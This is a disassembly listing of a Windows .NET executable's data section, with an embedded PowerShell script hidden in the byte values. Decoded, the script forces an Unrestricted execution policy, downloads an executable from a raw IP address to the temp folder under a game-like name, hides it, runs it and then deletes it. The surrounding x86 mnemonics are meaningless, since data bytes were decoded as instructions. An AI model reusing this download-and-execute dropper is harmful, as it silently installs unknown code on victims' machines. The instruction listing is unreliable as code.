  404ad8:	65 63 75 74          	arpl   %esi,%gs:0x74(%ebp)
  404adc:	69 6f 6e 50 6f 6c 69 	imul   $0x696c6f50,0x6e(%edi),%ebp
  404ae3:	63 79 27             	arpl   %edi,0x27(%ecx)
  404ae6:	69 20 55 6e 72 65    	imul   $0x65726e55,(%eax),%esp
  404aec:	73 74                	jae    0x404b62
  404aee:	72 69                	jb     0x404b59
  404af0:	63 74 65 64          	arpl   %esi,0x64(%ebp,%eiz,2)
  404af4:	20 79 61             	and    %bh,0x61(%ecx)
  404af7:	70 61                	jo     0x404b5a
  404af9:	72 61                	jb     0x404b5c
  404afb:	6b 20 62             	imul   $0x62,(%eax),%esp
  404afe:	65 74 69             	gs je  0x404b6a
  404b01:	6b 20 c3             	imul   $0xffffffc3,(%eax),%esp
  404b04:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404b05:	61                   	popa
  404b06:	6c                   	insb   (%dx),%es:(%edi)
  404b07:	c4 b1 c5 9f 74 c4    	les    -0x3b8b603b(%ecx),%esi
  404b0d:	b1 72                	mov    $0x72,%cl
  404b0f:	6d                   	insl   (%dx),%es:(%edi)
  404b10:	61                   	popa
  404b11:	79 c4                	jns    0x404ad7
  404b13:	b1 20                	mov    $0x20,%cl
  404b15:	65 74 6b             	gs je  0x404b83
  404b18:	69 6e 6c 65 c5 9f 74 	imul   $0x749fc565,0x6c(%esi),%ebp
  404b1f:	69 72 69 79 6f 72 75 	imul   $0x75726f79,0x69(%edx),%esi
  404b26:	7a 0d                	jp     0x404b35
  404b28:	0a 53 65             	or     0x65(%ebx),%dl
  404b2b:	74 2d                	je     0x404b5a
  404b2d:	45                   	inc    %ebp
  404b2e:	78 65                	js     0x404b95
  404b30:	63 75 74             	arpl   %esi,0x74(%ebp)
  404b33:	69 6f 6e 50 6f 6c 69 	imul   $0x696c6f50,0x6e(%edi),%ebp
  404b3a:	63 79 20             	arpl   %edi,0x20(%ecx)
  404b3d:	55                   	push   %ebp
  404b3e:	6e                   	outsb  %ds:(%esi),(%dx)
  404b3f:	72 65                	jb     0x404ba6
  404b41:	73 74                	jae    0x404bb7
  404b43:	72 69                	jb     0x404bae
  404b45:	63 74 65 64          	arpl   %esi,0x64(%ebp,%eiz,2)
  404b49:	20 2d 53 63 6f 70    	and    %ch,0x706f6353
  404b4f:	65 20 43 75          	and    %al,%gs:0x75(%ebx)
  404b53:	72 72                	jb     0x404bc7
  404b55:	65 6e                	outsb  %gs:(%esi),(%dx)
  404b57:	74 55                	je     0x404bae
  404b59:	73 65                	jae    0x404bc0
  404b5b:	72 20                	jb     0x404b7d
  404b5d:	2d 46 6f 72 63       	sub    $0x63726f46,%eax
  404b62:	65 0d 0a 0d 0a 23    	gs or  $0x230a0d0a,%eax
  404b68:	20 44 6f 73          	and    %al,0x73(%edi,%ebp,2)
  404b6c:	79 61                	jns    0x404bcf
  404b6e:	6e                   	outsb  %ds:(%esi),(%dx)
  404b6f:	c4 b1 6e 20 55 52    	les    0x5255206e(%ecx),%esi
  404b75:	4c                   	dec    %esp
  404b76:	27                   	daa
  404b77:	73 69                	jae    0x404be2
  404b79:	6e                   	outsb  %ds:(%esi),(%dx)
  404b7a:	69 20 62 65 6c 69    	imul   $0x696c6562,(%eax),%esp
  404b80:	72 74                	jb     0x404bf6
  404b82:	69 6e 0d 0a 24 65 78 	imul   $0x7865240a,0xd(%esi),%ebp
  404b89:	65 55                	gs push %ebp
  404b8b:	72 6c                	jb     0x404bf9
  404b8d:	20 3d 20 22 34 35    	and    %bh,0x35342220
  404b93:	2e 34 33             	cs xor $0x33,%al
  404b96:	2e 31 34 33          	xor    %esi,%cs:(%ebx,%esi,1)
  404b9a:	2e 32 31             	xor    %cs:(%ecx),%dh
  404b9d:	32 2f                	xor    (%edi),%ch
  404b9f:	73 74                	jae    0x404c15
  404ba1:	72 69                	jb     0x404c0c
  404ba3:	6e                   	outsb  %ds:(%esi),(%dx)
  404ba4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba5:	76 61                	jbe    0x404c08
  404ba7:	2e 65 78 65          	cs js,pn 0x404c10
  404bab:	22 0d 0a 0d 0a 23    	and    0x230a0d0a,%cl
  404bb1:	20 25 74 65 6d 70    	and    %ah,0x706d6574
  404bb7:	25 20 64 69 7a       	and    $0x7a696420,%eax
  404bbc:	69 6e 69 6e 69 20 61 	imul   $0x6120696e,0x69(%esi),%ebp
  404bc3:	6c                   	insb   (%dx),%es:(%edi)
  404bc4:	c4 b1 79 6f 72 75    	les    0x75726f79(%ecx),%esi
  404bca:	7a 0d                	jp     0x404bd9
  404bcc:	0a 24 74             	or     (%esp,%esi,2),%ah
  404bcf:	65 6d                	gs insl (%dx),%es:(%edi)
  404bd1:	70 44                	jo     0x404c17
  404bd3:	69 72 20 3d 20 5b 53 	imul   $0x535b203d,0x20(%edx),%esi
  404bda:	79 73                	jns    0x404c4f
  404bdc:	74 65                	je     0x404c43
  404bde:	6d                   	insl   (%dx),%es:(%edi)
  404bdf:	2e 49                	cs dec %ecx
  404be1:	4f                   	dec    %edi
  404be2:	2e 50                	cs push %eax
  404be4:	61                   	popa
  404be5:	74 68                	je     0x404c4f
  404be7:	5d                   	pop    %ebp
  404be8:	3a 3a                	cmp    (%edx),%bh
  404bea:	47                   	inc    %edi
  404beb:	65 74 54             	gs je  0x404c42
  404bee:	65 6d                	gs insl (%dx),%es:(%edi)
  404bf0:	70 50                	jo     0x404c42
  404bf2:	61                   	popa
  404bf3:	74 68                	je     0x404c5d
  404bf5:	28 29                	sub    %ch,(%ecx)
  404bf7:	0d 0a 0d 0a 23       	or     $0x230a0d0a,%eax
  404bfc:	20 25 74 65 6d 70    	and    %ah,0x706d6574
  404c02:	25 20 64 69 7a       	and    $0x7a696420,%eax
  404c07:	69 6e 69 6e 64 65 20 	imul   $0x2065646e,0x69(%esi),%ebp
  404c0e:	64 6f                	outsl  %fs:(%esi),(%dx)
  404c10:	73 79                	jae    0x404c8b
  404c12:	61                   	popa
  404c13:	20 79 6f             	and    %bh,0x6f(%ecx)
  404c16:	6c                   	insb   (%dx),%es:(%edi)
  404c17:	75 20                	jne    0x404c39
  404c19:	6f                   	outsl  %ds:(%esi),(%dx)
  404c1a:	6c                   	insb   (%dx),%es:(%edi)
  404c1b:	75 c5                	jne    0x404be2
  404c1d:	9f                   	lahf
  404c1e:	74 75                	je     0x404c95
  404c20:	72 75                	jb     0x404c97
  404c22:	79 6f                	jns    0x404c93
  404c24:	72 75                	jb     0x404c9b
  404c26:	7a 0d                	jp     0x404c35
  404c28:	0a 24 65 78 65 50 61 	or     0x61506578(,%eiz,2),%ah
  404c2f:	74 68                	je     0x404c99
  404c31:	20 3d 20 22 24 74    	and    %bh,0x74242220
  404c37:	65 6d                	gs insl (%dx),%es:(%edi)
  404c39:	70 44                	jo     0x404c7f
  404c3b:	69 72 5c 46 69 76 65 	imul   $0x65766946,0x5c(%edx),%esi
  404c42:	6d                   	insl   (%dx),%es:(%edi)
  404c43:	73 2e                	jae    0x404c73
  404c45:	65 78 65             	gs js  0x404cad
  404c48:	22 0d 0a 0d 0a 23    	and    0x230a0d0a,%cl
  404c4e:	20 49 6e             	and    %cl,0x6e(%ecx)
  404c51:	76 6f                	jbe    0x404cc2
  404c53:	6b 65 2d 57          	imul   $0x57,0x2d(%ebp),%esp
  404c57:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  404c5b:	71 75                	jno    0x404cd2
  404c5d:	65 73 74             	gs jae 0x404cd4
  404c60:	20 69 c5             	and    %ch,-0x3b(%ecx)
  404c63:	9f                   	lahf
  404c64:	6c                   	insb   (%dx),%es:(%edi)
  404c65:	65 6d                	gs insl (%dx),%es:(%edi)
  404c67:	69 20 61 72 6b 61    	imul   $0x616b7261,(%eax),%esp
  404c6d:	20 70 6c             	and    %dh,0x6c(%eax)
  404c70:	61                   	popa
  404c71:	6e                   	outsb  %ds:(%esi),(%dx)
  404c72:	64 61                	fs popa
  404c74:	20 62 61             	and    %ah,0x61(%edx)
  404c77:	c5 9f 6c 61 74 c4    	lds    -0x3b8b9e94(%edi),%ebx
  404c7d:	b1 6c                	mov    $0x6c,%cl
  404c7f:	c4 b1 79 6f 72 0d    	les    0xd726f79(%ecx),%esi
  404c85:	0a 24 77             	or     (%edi,%esi,2),%ah
  404c88:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  404c8c:	71 75                	jno    0x404d03
  404c8e:	65 73 74             	gs jae 0x404d05
  404c91:	4a                   	dec    %edx
  404c92:	6f                   	outsl  %ds:(%esi),(%dx)
  404c93:	62 20                	bound  %esp,(%eax)
  404c95:	3d 20 53 74 61       	cmp    $0x61745320,%eax
  404c9a:	72 74                	jb     0x404d10
  404c9c:	2d 4a 6f 62 20       	sub    $0x20626f4a,%eax
  404ca1:	2d 53 63 72 69       	sub    $0x69726353,%eax
  404ca6:	70 74                	jo     0x404d1c
  404ca8:	42                   	inc    %edx
  404ca9:	6c                   	insb   (%dx),%es:(%edi)
  404caa:	6f                   	outsl  %ds:(%esi),(%dx)
  404cab:	63 6b 20             	arpl   %ebp,0x20(%ebx)
  404cae:	7b 0d                	jnp    0x404cbd
  404cb0:	0a 20                	or     (%eax),%ah
  404cb2:	20 20                	and    %ah,(%eax)
  404cb4:	20 49 6e             	and    %cl,0x6e(%ecx)
  404cb7:	76 6f                	jbe    0x404d28
  404cb9:	6b 65 2d 57          	imul   $0x57,0x2d(%ebp),%esp
  404cbd:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  404cc1:	71 75                	jno    0x404d38
  404cc3:	65 73 74             	gs jae 0x404d3a
  404cc6:	20 2d 55 72 69 20    	and    %ch,0x20697255
  404ccc:	24 75                	and    $0x75,%al
  404cce:	73 69                	jae    0x404d39
  404cd0:	6e                   	outsb  %ds:(%esi),(%dx)
  404cd1:	67 3a 65 78          	cmp    0x78(%di),%ah
  404cd5:	65 55                	gs push %ebp
  404cd7:	72 6c                	jb     0x404d45
  404cd9:	20 2d 4f 75 74 46    	and    %ch,0x4674754f
  404cdf:	69 6c 65 20 24 75 73 	imul   $0x69737524,0x20(%ebp,%eiz,2),%ebp
  404ce6:	69 
  404ce7:	6e                   	outsb  %ds:(%esi),(%dx)
  404ce8:	67 3a 65 78          	cmp    0x78(%di),%ah
  404cec:	65 50                	gs push %eax
  404cee:	61                   	popa
  404cef:	74 68                	je     0x404d59
  404cf1:	0d 0a 7d 0d 0a       	or     $0xa0d7d0a,%eax
  404cf6:	0d 0a 23 20 57       	or     $0x5720230a,%eax
  404cfb:	65 62 20             	bound  %esp,%gs:(%eax)
  404cfe:	69 73 74 65 c4 9f 69 	imul   $0x699fc465,0x74(%ebx),%esi
  404d05:	20 74 61 6d          	and    %dh,0x6d(%ecx,%eiz,2)
  404d09:	61                   	popa
  404d0a:	6d                   	insl   (%dx),%es:(%edi)
  404d0b:	6c                   	insb   (%dx),%es:(%edi)
  404d0c:	61                   	popa
  404d0d:	6e                   	outsb  %ds:(%esi),(%dx)
  404d0e:	61                   	popa
  404d0f:	6e                   	outsb  %ds:(%esi),(%dx)
  404d10:	61                   	popa
  404d11:	20 6b 61             	and    %ch,0x61(%ebx)
  404d14:	64 61                	fs popa
  404d16:	72 20                	jb     0x404d38
  404d18:	62 65 6b             	bound  %esp,0x6b(%ebp)
  404d1b:	6c                   	insb   (%dx),%es:(%edi)
  404d1c:	69 79 6f 72 75 7a 0d 	imul   $0xd7a7572,0x6f(%ecx),%edi
  404d23:	0a 57 61             	or     0x61(%edi),%dl
  404d26:	69 74 2d 4a 6f 62 20 	imul   $0x2d20626f,0x4a(%ebp,%ebp,1),%esi
  404d2d:	2d 
  404d2e:	4a                   	dec    %edx
  404d2f:	6f                   	outsl  %ds:(%esi),(%dx)
  404d30:	62 20                	bound  %esp,(%eax)
  404d32:	24 77                	and    $0x77,%al
  404d34:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  404d38:	71 75                	jno    0x404daf
  404d3a:	65 73 74             	gs jae 0x404db1
  404d3d:	4a                   	dec    %edx
  404d3e:	6f                   	outsl  %ds:(%esi),(%dx)
  404d3f:	62 0d 0a 0d 0a 23    	bound  %ecx,0x230a0d0a
  404d45:	20 c4                	and    %al,%ah
  404d47:	b0 c5                	mov    $0xc5,%al
  404d49:	9f                   	lahf
  404d4a:	6c                   	insb   (%dx),%es:(%edi)
  404d4b:	65 6d                	gs insl (%dx),%es:(%edi)
  404d4d:	20 74 61 6d          	and    %dh,0x6d(%ecx,%eiz,2)
  404d51:	61                   	popa
  404d52:	6d                   	insl   (%dx),%es:(%edi)
  404d53:	6c                   	insb   (%dx),%es:(%edi)
  404d54:	61                   	popa
  404d55:	6e                   	outsb  %ds:(%esi),(%dx)
  404d56:	64 c4 b1 6b 74 61 6e 	les    %fs:0x6e61746b(%ecx),%esi
  404d5d:	20 73 6f             	and    %dh,0x6f(%ebx)
  404d60:	6e                   	outsb  %ds:(%esi),(%dx)
  404d61:	72 61                	jb     0x404dc4
  404d63:	20 61 72             	and    %ah,0x72(%ecx)
  404d66:	6b 61 20 70          	imul   $0x70,0x20(%ecx),%esp
  404d6a:	6c                   	insb   (%dx),%es:(%edi)
  404d6b:	61                   	popa
  404d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404d6d:	64 61                	fs popa
  404d6f:	20 62 61             	and    %ah,0x61(%edx)
  404d72:	c5 9f 6c 61 74 c4    	lds    -0x3b8b9e94(%edi),%ebx
  404d78:	b1 6c                	mov    $0x6c,%cl
  404d7a:	61                   	popa
  404d7b:	6e                   	outsb  %ds:(%esi),(%dx)
  404d7c:	20 69 c5             	and    %ch,-0x3b(%ecx)
  404d7f:	9f                   	lahf
  404d80:	20 62 69             	and    %ah,0x69(%edx)
  404d83:	74 69                	je     0x404dee
  404d85:	72 69                	jb     0x404df0
  404d87:	6c                   	insb   (%dx),%es:(%edi)
  404d88:	69 79 6f 72 0d 0a 52 	imul   $0x520a0d72,0x6f(%ecx),%edi
  404d8f:	65 6d                	gs insl (%dx),%es:(%edi)
  404d91:	6f                   	outsl  %ds:(%esi),(%dx)
  404d92:	76 65                	jbe    0x404df9
  404d94:	2d 4a 6f 62 20       	sub    $0x20626f4a,%eax
  404d99:	2d 4a 6f 62 20       	sub    $0x20626f4a,%eax
  404d9e:	24 77                	and    $0x77,%al
  404da0:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  404da4:	71 75                	jno    0x404e1b
  404da6:	65 73 74             	gs jae 0x404e1d
  404da9:	4a                   	dec    %edx
  404daa:	6f                   	outsl  %ds:(%esi),(%dx)
  404dab:	62 0d 0a 0d 0a 23    	bound  %ecx,0x230a0d0a
  404db1:	20 44 6f 73          	and    %al,0x73(%edi,%ebp,2)
  404db5:	79 61                	jns    0x404e18
  404db7:	20 69 6e             	and    %ch,0x6e(%ecx)
  404dba:	64 69 72 69 6c 64 69 	imul   $0x6b69646c,%fs:0x69(%edx),%esi
  404dc1:	6b 
  404dc2:	74 65                	je     0x404e29
  404dc4:	6e                   	outsb  %ds:(%esi),(%dx)
  404dc5:	20 73 6f             	and    %dh,0x6f(%ebx)
  404dc8:	6e                   	outsb  %ds:(%esi),(%dx)
  404dc9:	72 61                	jb     0x404e2c
  404dcb:	20 67 69             	and    %ah,0x69(%edi)
  404dce:	7a 6c                	jp     0x404e3c
  404dd0:	69 20 79 61 70 c4    	imul   $0xc4706179,(%eax),%esp
  404dd6:	b1 79                	mov    $0x79,%cl
  404dd8:	6f                   	outsl  %ds:(%esi),(%dx)
  404dd9:	72 75                	jb     0x404e50
  404ddb:	7a 0d                	jp     0x404dea
  404ddd:	0a 53 65             	or     0x65(%ebx),%dl
  404de0:	74 2d                	je     0x404e0f
  404de2:	49                   	dec    %ecx
  404de3:	74 65                	je     0x404e4a
  404de5:	6d                   	insl   (%dx),%es:(%edi)
  404de6:	50                   	push   %eax
  404de7:	72 6f                	jb     0x404e58
  404de9:	70 65                	jo     0x404e50
  404deb:	72 74                	jb     0x404e61
  404ded:	79 20                	jns    0x404e0f
  404def:	2d 50 61 74 68       	sub    $0x68746150,%eax
  404df4:	20 24 65 78 65 50 61 	and    %ah,0x61506578(,%eiz,2)
  404dfb:	74 68                	je     0x404e65
  404dfd:	20 2d 4e 61 6d 65    	and    %ch,0x656d614e
  404e03:	20 41 74             	and    %al,0x74(%ecx)
  404e06:	74 72                	je     0x404e7a
  404e08:	69 62 75 74 65 73 20 	imul   $0x20736574,0x75(%edx),%esp
  404e0f:	2d 56 61 6c 75       	sub    $0x756c6156,%eax
  404e14:	65 20 27             	and    %ah,%gs:(%edi)
  404e17:	48                   	dec    %eax
  404e18:	69 64 64 65 6e 27 0d 	imul   $0xa0d276e,0x65(%esp,%eiz,2),%esp
  404e1f:	0a 
  404e20:	0d 0a 23 20 44       	or     $0x4420230a,%eax
  404e25:	6f                   	outsl  %ds:(%esi),(%dx)
  404e26:	73 79                	jae    0x404ea1
  404e28:	61                   	popa
  404e29:	79 c4                	jns    0x404def
  404e2b:	b1 20                	mov    $0x20,%cl
  404e2d:	c3                   	ret
  404e2e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404e2f:	61                   	popa
  404e30:	6c                   	insb   (%dx),%es:(%edi)
  404e31:	c4 b1 c5 9f 74 c4    	les    -0x3b8b603b(%ecx),%esi
  404e37:	b1 72                	mov    $0x72,%cl
  404e39:	c4 b1 79 6f 72 75    	les    0x75726f79(%ecx),%esi
  404e3f:	7a 0d                	jp     0x404e4e
  404e41:	0a 53 74             	or     0x74(%ebx),%dl
  404e44:	61                   	popa
  404e45:	72 74                	jb     0x404ebb
  404e47:	2d 50 72 6f 63       	sub    $0x636f7250,%eax
  404e4c:	65 73 73             	gs jae 0x404ec2
  404e4f:	20 24 65 78 65 50 61 	and    %ah,0x61506578(,%eiz,2)
  404e56:	74 68                	je     0x404ec0
  404e58:	0d 0a 0d 0a 23       	or     $0x230a0d0a,%eax
  404e5d:	20 42 65             	and    %al,0x65(%edx)
  404e60:	74 69                	je     0x404ecb
  404e62:	6b 20 64             	imul   $0x64,(%eax),%esp
  404e65:	6f                   	outsl  %ds:(%esi),(%dx)
  404e66:	73 79                	jae    0x404ee1
  404e68:	61                   	popa
  404e69:	73 c4                	jae    0x404e2f
  404e6b:	b1 6e                	mov    $0x6e,%cl
  404e6d:	c4 b1 6e 20 6b 65    	les    0x656b206e(%ecx),%esi
  404e73:	6e                   	outsb  %ds:(%esi),(%dx)
  404e74:	64 69 6e 69 20 73 69 	imul   $0x6c697320,%fs:0x69(%esi),%ebp
  404e7b:	6c 
  404e7c:	6d                   	insl   (%dx),%es:(%edi)
  404e7d:	65 73 69             	gs jae 0x404ee9
  404e80:	20 69 c3             	and    %ch,-0x3d(%ecx)
  404e83:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404e84:	69 6e 20 6b c4 b1 73 	imul   $0x73b1c46b,0x20(%esi),%ebp
  404e8b:	61                   	popa
  404e8c:	20 62 69             	and    %ah,0x69(%edx)
  404e8f:	72 20                	jb     0x404eb1
  404e91:	67 65 63 69 6b       	arpl   %ebp,%gs:0x6b(%bx,%di)
  404e96:	6d                   	insl   (%dx),%es:(%edi)
  404e97:	65 20 65 6b          	and    %ah,%gs:0x6b(%ebp)
  404e9b:	6c                   	insb   (%dx),%es:(%edi)
  404e9c:	69 79 6f 72 75 7a 20 	imul   $0x207a7572,0x6f(%ecx),%edi
  404ea3:	76 65                	jbe    0x404f0a
  404ea5:	20 61 72             	and    %ah,0x72(%ecx)
  404ea8:	64 c4 b1 6e 64 61 6e 	les    %fs:0x6e61646e(%ecx),%esi
  404eaf:	20 6b 65             	and    %ch,0x65(%ebx)
  404eb2:	6e                   	outsb  %ds:(%esi),(%dx)
  404eb3:	64 69 6e 69 20 73 69 	imul   $0x6c697320,%fs:0x69(%esi),%ebp
  404eba:	6c 
  404ebb:	6d                   	insl   (%dx),%es:(%edi)
  404ebc:	65 73 69             	gs jae 0x404f28
  404ebf:	6e                   	outsb  %ds:(%esi),(%dx)
  404ec0:	69 20 73 61 c4 9f    	imul   $0x9fc46173,(%eax),%esp
  404ec6:	6c                   	insb   (%dx),%es:(%edi)
  404ec7:	c4 b1 79 6f 72 75    	les    0x75726f79(%ecx),%esi
  404ecd:	7a 0d                	jp     0x404edc
  404ecf:	0a 53 74             	or     0x74(%ebx),%dl
  404ed2:	61                   	popa
  404ed3:	72 74                	jb     0x404f49
  404ed5:	2d 53 6c 65 65       	sub    $0x65656c53,%eax
  404eda:	70 20                	jo     0x404efc
  404edc:	2d 53 65 63 6f       	sub    $0x6f636553,%eax
  404ee1:	6e                   	outsb  %ds:(%esi),(%dx)
  404ee2:	64 73 20             	fs jae 0x404f05
  404ee5:	34 0d                	xor    $0xd,%al
  404ee7:	0a 52 65             	or     0x65(%edx),%dl
  404eea:	6d                   	insl   (%dx),%es:(%edi)
  404eeb:	6f                   	outsl  %ds:(%esi),(%dx)
  404eec:	76 65                	jbe    0x404f53
  404eee:	2d 49 74 65 6d       	sub    $0x6d657449,%eax
  404ef3:	20 2d 50 61 74 68    	and    %ch,0x68746150
  404ef9:	20 24 65 78 65 50 61 	and    %ah,0x61506578(,%eiz,2)
  404f00:	74 68                	je     0x404f6a
  404f02:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  404f08:	65 0d 0a 00 42 53    	gs or  $0x5342000a,%eax
  404f0e:	4a                   	dec    %edx
  404f0f:	42                   	inc    %edx
  404f10:	01 00                	add    %eax,(%eax)
  404f12:	01 00                	add    %eax,(%eax)
  404f14:	00 00                	add    %al,(%eax)
  404f16:	00 00                	add    %al,(%eax)
  404f18:	0c 00                	or     $0x0,%al
  404f1a:	00 00                	add    %al,(%eax)
  404f1c:	76 34                	jbe    0x404f52
  404f1e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  404f21:	33 30                	xor    (%eax),%esi
  404f23:	33 31                	xor    (%ecx),%esi
  404f25:	39 00                	cmp    %eax,(%eax)
  404f27:	00 00                	add    %al,(%eax)
  404f29:	00 05 00 6c 00 00    	add    %al,0x6c00
  404f2f:	00 3c 1b             	add    %bh,(%ebx,%ebx,1)
  404f32:	00 00                	add    %al,(%eax)
  404f34:	23 7e 00             	and    0x0(%esi),%edi
  404f37:	00 a8 1b 00 00 70    	add    %ch,0x7000001b(%eax)
  404f3d:	21 00                	and    %eax,(%eax)
  404f3f:	00 23                	add    %ah,(%ebx)
  404f41:	53                   	push   %ebx
  404f42:	74 72                	je     0x404fb6
  404f44:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  404f4b:	00 18                	add    %bl,(%eax)
  404f4d:	3d 00 00 10 05       	cmp    $0x5100000,%eax
  404f52:	00 00                	add    %al,(%eax)
  404f54:	23 55 53             	and    0x53(%ebp),%edx
  404f57:	00 28                	add    %ch,(%eax)
  404f59:	42                   	inc    %edx
  404f5a:	00 00                	add    %al,(%eax)
  404f5c:	10 00                	adc    %al,(%eax)
  404f5e:	00 00                	add    %al,(%eax)
  404f60:	23 47 55             	and    0x55(%edi),%eax
  404f63:	49                   	dec    %ecx
  404f64:	44                   	inc    %esp
  404f65:	00 00                	add    %al,(%eax)
  404f67:	00 38                	add    %bh,(%eax)
  404f69:	42                   	inc    %edx
  404f6a:	00 00                	add    %al,(%eax)
  404f6c:	0c 08                	or     $0x8,%al
  404f6e:	00 00                	add    %al,(%eax)
  404f70:	23 42 6c             	and    0x6c(%edx),%eax
  404f73:	6f                   	outsl  %ds:(%esi),(%dx)
  404f74:	62 00                	bound  %eax,(%eax)
  404f76:	00 00                	add    %al,(%eax)
  404f78:	00 00                	add    %al,(%eax)
  404f7a:	00 00                	add    %al,(%eax)
  404f7c:	02 00                	add    (%eax),%al
  404f7e:	00 01                	add    %al,(%ecx)
  404f80:	57                   	push   %edi
  404f81:	3f                   	aas
  404f82:	a2 1d 09 0b 00       	mov    %al,0xb091d
  404f87:	00 00                	add    %al,(%eax)
  404f89:	fa                   	cli
  404f8a:	25 33 00 16 00       	and    $0x160033,%eax
  404f8f:	00 01                	add    %al,(%ecx)
  404f91:	00 00                	add    %al,(%eax)
  404f93:	00 93 00 00 00 13    	add    %dl,0x13000000(%ebx)
  404f99:	00 00                	add    %al,(%eax)
  404f9b:	00 50 00             	add    %dl,0x0(%eax)
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	78 00                	js     0x404fa2
  404fa2:	00 00                	add    %al,(%eax)
  404fa4:	80 00 00             	addb   $0x0,(%eax)
  404fa7:	00 01                	add    %al,(%ecx)
  404fa9:	00 00                	add    %al,(%eax)
  404fab:	00 20                	add    %ah,(%eax)
  404fad:	01 00                	add    %eax,(%eax)
  404faf:	00 19                	add    %bl,(%ecx)
  404fb1:	00 00                	add    %al,(%eax)
  404fb3:	00 0b                	add    %cl,(%ebx)
  404fb5:	00 00                	add    %al,(%eax)
  404fb7:	00 02                	add    %al,(%edx)
  404fb9:	00 00                	add    %al,(%eax)
  404fbb:	00 12                	add    %dl,(%edx)
  404fbd:	00 00                	add    %al,(%eax)
  404fbf:	00 06                	add    %al,(%esi)
  404fc1:	00 00                	add    %al,(%eax)
  404fc3:	00 21                	add    %ah,(%ecx)
  404fc5:	00 00                	add    %al,(%eax)
  404fc7:	00 37                	add    %dh,(%edi)
  404fc9:	00 00                	add    %al,(%eax)
  404fcb:	00 02                	add    %al,(%edx)
  404fcd:	00 00                	add    %al,(%eax)
  404fcf:	00 0b                	add    %cl,(%ebx)
  404fd1:	00 00                	add    %al,(%eax)
  404fd3:	00 03                	add    %al,(%ebx)
  404fd5:	00 00                	add    %al,(%eax)
  404fd7:	00 01                	add    %al,(%ecx)
  404fd9:	00 00                	add    %al,(%eax)
  404fdb:	00 05 00 00 00 01    	add    %al,0x1000000
  404fe1:	00 00                	add    %al,(%eax)
  404fe3:	00 08                	add    %cl,(%eax)
  404fe5:	00 00                	add    %al,(%eax)
  404fe7:	00 02                	add    %al,(%edx)
  404fe9:	00 00                	add    %al,(%eax)
  404feb:	00 00                	add    %al,(%eax)
  404fed:	00 0a                	add    %cl,(%edx)
  404fef:	00 01                	add    %al,(%ecx)
  404ff1:	00 00                	add    %al,(%eax)
  404ff3:	00 00                	add    %al,(%eax)
  404ff5:	00 06                	add    %al,(%esi)
  404ff7:	00 17                	add    %dl,(%edi)
  404ff9:	01 10                	add    %edx,(%eax)
  404ffb:	01 06                	add    %eax,(%esi)
  404ffd:	00 1e                	add    %bl,(%esi)
  404fff:	01 10                	add    %edx,(%eax)
  405001:	01 06                	add    %eax,(%esi)
  405003:	00 28                	add    %ch,(%eax)
  405005:	01 10                	add    %edx,(%eax)
  405007:	01 0a                	add    %ecx,(%edx)
  405009:	00 6c 01 4a          	add    %ch,0x4a(%ecx,%eax,1)
  40500d:	01 0e                	add    %ecx,(%esi)
  40500f:	00 98 01 83 01 0a    	add    %bl,0xa018301(%eax)
  405015:	00 9d 01 4a 01 0a    	add    %bl,0xa014a01(%ebp)
  40501b:	00 b1 01 4a 01 06    	add    %dh,0x6014a01(%ecx)
  405021:	00 c4                	add    %al,%ah
  405023:	01 b8 01 0a 00 ed    	add    %edi,-0x12fff5ff(%eax)
  405029:	01 2d 01 0a 00 ff    	add    %ebp,0xff000a01
  40502f:	01 2d 01 06 00 61    	add    %ebp,0x61000601
  405035:	04 10                	add    $0x10,%al
  405037:	01 0a                	add    %ecx,(%edx)
  405039:	00 c5                	add    %al,%ch
  40503b:	04 4a                	add    $0x4a,%al
  40503d:	01 0a                	add    %ecx,(%edx)
  40503f:	00 e8                	add    %ch,%al
  405041:	04 4a                	add    $0x4a,%al
  405043:	01 0a                	add    %ecx,(%edx)
  405045:	00 80 05 4a 01 0a    	add    %al,0xa014a05(%eax)
  40504b:	00 8b 05 4a 01 0a    	add    %cl,0xa014a05(%ebx)
  405051:	00 e4                	add    %ah,%ah
  405053:	05 4a 01 0a 00       	add    $0xa014a,%eax
  405058:	ec                   	in     (%dx),%al
  405059:	05 4a 01 0e 00       	add    $0xe014a,%eax
  40505e:	37                   	aaa
  40505f:	07                   	pop    %es
  405060:	83 01 06             	addl   $0x6,(%ecx)
  405063:	00 68 07             	add    %ch,0x7(%eax)
  405066:	49                   	dec    %ecx
  405067:	07                   	pop    %es
  405068:	0a 00                	or     (%eax),%al
  40506a:	75 07                	jne    0x405073
  40506c:	4a                   	dec    %edx
  40506d:	01 0e                	add    %ecx,(%esi)
  40506f:	00 91 07 83 01 0e    	add    %dl,0xe018307(%ecx)
  405075:	00 bb 07 83 01 12    	add    %bh,0x12018307(%ebx)
  40507b:	00 11                	add    %dl,(%ecx)
  40507d:	08 03                	or     %al,(%ebx)
  40507f:	08 06                	or     %al,(%esi)
  405081:	00 52 08             	add    %dl,0x8(%edx)
  405084:	37                   	aaa
  405085:	08 16                	or     %dl,(%esi)
  405087:	00 79 08             	add    %bh,0x8(%ecx)
  40508a:	6a 08                	push   $0x8
  40508c:	12 00                	adc    (%eax),%al
  40508e:	a0 08 03 08 0a       	mov    0xa080308,%al
  405093:	00 ca                	add    %cl,%dl
  405095:	08 2d 01 0e 00 e0    	or     %ch,0xe0000e01
  40509b:	08 83 01 0e 00 fa    	or     %al,-0x5fff1ff(%ebx)
  4050a1:	08 83 01 06 00 39    	or     %al,0x39000601(%ebx)
  4050a7:	0a 37                	or     (%edi),%dh
  4050a9:	08 0a                	or     %cl,(%edx)
  4050ab:	00 46 0a             	add    %al,0xa(%esi)
  4050ae:	2d 01 0a 00 4f       	sub    $0x4f000a01,%eax
  4050b3:	0a 4a 01             	or     0x1(%edx),%cl
  4050b6:	0a 00                	or     (%eax),%al
  4050b8:	77 0a                	ja     0x4050c4
  4050ba:	2d 01 06 00 c6       	sub    $0xc6000601,%eax
